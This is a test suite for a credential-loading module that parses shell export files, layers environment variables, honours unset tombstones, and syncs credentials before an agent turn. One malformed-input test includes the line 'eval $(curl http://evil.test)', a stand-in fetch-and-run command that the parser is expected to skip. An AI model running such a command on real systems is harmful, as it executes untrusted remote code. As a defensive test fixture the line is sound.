import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { ActorService, Subscriber } from "../src/actor.js";
import { ChatSessionStore } from "../src/chat-session.js";
import { CredentialSource, parseCredentialExportFile } from "../src/credentials.js";
import type { AgentAdapter, Provider } from "../src/types.js";
import type { ConnectionIdentity } from "../src/auth.js";

/**
 * The credentials a workspace connects arrive as shell export files in
 * `<state>/creds/env.d`, and until this merge existed a chat turn was the one
 * participant in the box that could not read them: login shells source the
 * glob through /etc/profile.d/blitz-creds.sh, the actor read only
 * `env/environment.json`. These pin the decoder against the exact bytes the Go
 * writer emits (`environmentFile`/`shellQuote` in
 * packages/broker/internal/workspace/cp.go) and the layering against the order
 * the shell glob applies.
 */

const directories: string[] = [];
const originalPath = process.env.PATH;

afterEach(() => {
  process.env.PATH = originalPath;
  for (const directory of directories.splice(0)) {
    rmSync(directory, { recursive: true, force: true });
  }
});

function stateDir(): string {
  const directory = mkdtempSync(join(tmpdir(), "blitz-creds-env-"));
  directories.push(directory);
  return directory;
}

/** `shellQuote` from cp.go, so the corpus below is the writer's own output and
 * not a hand-drawn imitation of it. */
function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'"'"'`)}'`;
}

function exportLine(name: string, value: string): string {
  return `export ${name}=${shellQuote(value)}\n`;
}

/** Writes one env.d entry the way the broker does: exports first, then the
 * unset tombstones. */
function writeEnvFile(directory: string, file: string, lines: string[]): void {
  const envDir = join(directory, "creds", "env.d");
  mkdirSync(envDir, { recursive: true });
  writeFileSync(join(envDir, file), lines.join(""));
}

function writeWorkspaceEnvironment(directory: string, env: Record<string, string>): void {
  mkdirSync(join(directory, "env"), { recursive: true });
  writeFileSync(
    join(directory, "env", "environment.json"),
    JSON.stringify({ env, startupScript: null, filesReady: true }),
  );
}

describe("credential export file decoding", () => {
  it("reads the plain export lines the broker writes", () => {
    expect(parseCredentialExportFile(exportLine("GH_TOKEN", "ghs_abc123") + exportLine("LINEAR_API_KEY", "lin_x"))).toEqual([
      { kind: "export", name: "GH_TOKEN", value: "ghs_abc123" },
      { kind: "export", name: "LINEAR_API_KEY", value: "lin_x" },
    ]);
  });

  it("unescapes a value carrying single quotes the way shellQuote escaped it", () => {
    // The close-quote-a-quote-reopen dance, which a naive split on ' would
    // shred into three variables and a syntax error.
    const source = exportLine("MOTTO", "it's a 'quoted' token");
    expect(source).toBe(`export MOTTO='it'"'"'s a '"'"'quoted'"'"' token'\n`);
    expect(parseCredentialExportFile(source)).toEqual([
      { kind: "export", name: "MOTTO", value: "it's a 'quoted' token" },
    ]);
    // A value that is nothing but a quote is the degenerate case: the escape
    // sits flush against both delimiters.
    expect(parseCredentialExportFile(exportLine("ONE", "'"))).toEqual([
      { kind: "export", name: "ONE", value: "'" },
    ]);
  });

  it("keeps an unset line as a removal rather than an absence", () => {
    expect(parseCredentialExportFile(`${exportLine("KEPT", "yes")}unset RETRACTED\n`)).toEqual([
      { kind: "export", name: "KEPT", value: "yes" },
      { kind: "unset", name: "RETRACTED" },
    ]);
  });

  it("skips a line it cannot read and keeps the credentials around it", () => {
    const source = [
      exportLine("BEFORE", "1"),
      "export 9INVALID='x'\n",
      "eval $(curl http://evil.test)\n",
      "export UNTERMINATED='oops\n",
      exportLine("AFTER", "2"),
    ].join("");
    expect(parseCredentialExportFile(source)).toEqual([
      { kind: "export", name: "BEFORE", value: "1" },
      { kind: "export", name: "AFTER", value: "2" },
    ]);
  });

  it("carries values holding =, spaces and newlines through intact", () => {
    const connection = "postgres://u:p@host:5432/db?sslmode=require";
    const pem = "-----BEGIN KEY-----\nline one\nline two\n-----END KEY-----";
    expect(parseCredentialExportFile(exportLine("DATABASE_URL", connection)
      + exportLine("GREETING", "  two  words  ")
      + exportLine("SERVICE_KEY", pem))).toEqual([
      { kind: "export", name: "DATABASE_URL", value: connection },
      { kind: "export", name: "GREETING", value: "  two  words  " },
      { kind: "export", name: "SERVICE_KEY", value: pem },
    ]);
  });
});

describe("credential environment layering", () => {
  it("applies env.d in glob order over the workspace variables and the process env", async () => {
    const directory = stateDir();
    writeWorkspaceEnvironment(directory, { PROJECT_MODE: "analysis", GH_TOKEN: "workspace-guess" });
    // 00-workspace.sh sorts first exactly so a minted credential wins the
    // collision; github.sh is what the broker names the integration entry.
    writeEnvFile(directory, "00-workspace.sh", [
      exportLine("PROJECT_MODE", "analysis"),
      exportLine("GH_TOKEN", "workspace-guess"),
    ]);
    writeEnvFile(directory, "github.sh", [exportLine("GH_TOKEN", "ghs_minted")]);
    writeEnvFile(directory, "linear.sh", [exportLine("LINEAR_API_KEY", "lin_minted")]);

    const environment = await new CredentialSource(directory).environment();
    expect(environment.GH_TOKEN).toBe("ghs_minted");
    expect(environment.LINEAR_API_KEY).toBe("lin_minted");
    expect(environment.PROJECT_MODE).toBe("analysis");
    // The actor's own environment stays underneath both layers.
    expect(environment.PATH).toBe(process.env.PATH);
  });

  it("lets a tombstone retract a name held further down the stack", async () => {
    const directory = stateDir();
    process.env.BLITZ_TEST_INHERITED = "from-the-actor";
    writeWorkspaceEnvironment(directory, { GH_TOKEN: "workspace-guess" });
    writeEnvFile(directory, "00-workspace.sh", [exportLine("GH_TOKEN", "workspace-guess")]);
    writeEnvFile(directory, "github.sh", ["unset GH_TOKEN\n", "unset BLITZ_TEST_INHERITED\n"]);
    try {
      const environment = await new CredentialSource(directory).environment();
      // A revoked capability must not survive because some lower layer happens
      // to hold the same name — that is precisely what the shell would do.
      expect("GH_TOKEN" in environment).toBe(false);
      expect("BLITZ_TEST_INHERITED" in environment).toBe(false);
    } finally {
      delete process.env.BLITZ_TEST_INHERITED;
    }
  });

  it("degrades to the workspace variables alone when env.d is absent", async () => {
    const directory = stateDir();
    writeWorkspaceEnvironment(directory, { PROJECT_MODE: "analysis" });
    const environment = await new CredentialSource(directory).environment();
    expect(environment.PROJECT_MODE).toBe("analysis");
    expect(environment.PATH).toBe(process.env.PATH);
  });

  it("degrades rather than throwing when env.d is unreadable", async () => {
    const directory = stateDir();
    // A directory the process cannot list is the same answer as no directory:
    // no credentials, and a turn that still runs.
    mkdirSync(join(directory, "creds", "env.d"), { recursive: true });
    chmodSync(join(directory, "creds", "env.d"), 0o000);
    try {
      await expect(new CredentialSource(directory).environment())
        .resolves.toMatchObject({ PATH: process.env.PATH });
    } finally {
      chmodSync(join(directory, "creds", "env.d"), 0o700);
    }
  });
});

/** A `blitz-cred` on PATH that appends its argv and the state directory it was
 * pointed at to a log, then exits with `status`. */
function credShim(directory: string, status: number): string {
  const log = join(directory, "cred-calls");
  const shim = join(directory, "blitz-cred");
  writeFileSync(shim, `#!/bin/sh\nprintf '%s %s\\n' "$*" "$BLITZ_STATE_DIR" >>'${log}'\nexit ${status}\n`);
  chmodSync(shim, 0o755);
  process.env.PATH = `${directory}:${originalPath ?? ""}`;
  return log;
}

describe("pre-turn credential sync", () => {
  it("asks blitz-cred to sync this box's state directory", async () => {
    const directory = stateDir();
    const log = credShim(directory, 0);
    await new CredentialSource(directory).sync();
    expect(readLog(log)).toEqual([`sync ${directory}`]);
  });

  it("swallows a refusal so a turn never fails over a sync", async () => {
    const directory = stateDir();
    const log = credShim(directory, 1);
    await expect(new CredentialSource(directory).sync()).resolves.toBeUndefined();
    expect(readLog(log)).toEqual([`sync ${directory}`]);
  });

  it("swallows a missing binary, which is every unenrolled box", async () => {
    const directory = stateDir();
    process.env.PATH = directory;
    await expect(new CredentialSource(directory).sync()).resolves.toBeUndefined();
  });
});

function readLog(path: string): string[] {
  return readFileSync(path, "utf8").trim().split("\n");
}

/** Records the order the turn touches the credential source in. Both calls are
 * overridden rather than spied so the suite never shells out. */
class OrderedCredentials extends CredentialSource {
  public readonly calls: string[] = [];

  public override async token(_provider: Provider): Promise<string | null> {
    this.calls.push("token");
    return null;
  }

  public override async sync(): Promise<void> {
    this.calls.push("sync");
  }

  public override async environment(): Promise<NodeJS.ProcessEnv> {
    this.calls.push("environment");
    return {};
  }
}

const owner: ConnectionIdentity = { userId: "u", membershipId: "m", role: "owner" };

describe("the actor syncs before it reads the environment", () => {
  it("runs one sync per turn, ahead of the env the harness is handed", async () => {
    const directory = stateDir();
    const store = new ChatSessionStore(join(directory, "chat-session.db"));
    const credentials = new OrderedCredentials(directory);
    const adapter: AgentAdapter = {
      runTurn: () => Promise.resolve({ stopReason: "end_turn" as const }),
    };
    const service = new ActorService(store, credentials, () => adapter, "claude");
    const subscriber = new Subscriber("sub", owner, () => undefined);
    try {
      const session = await service.newSession("/workspace", subscriber);
      await service.prompt(session, [{ type: "text", text: "hello" }], subscriber);
    } finally {
      store.close();
    }
    // Sync last would deliver the credentials to the turn after the one that
    // needed them; twice would double the wait a signed-out box pays.
    expect(credentials.calls).toEqual(["token", "sync", "environment"]);
  });
});
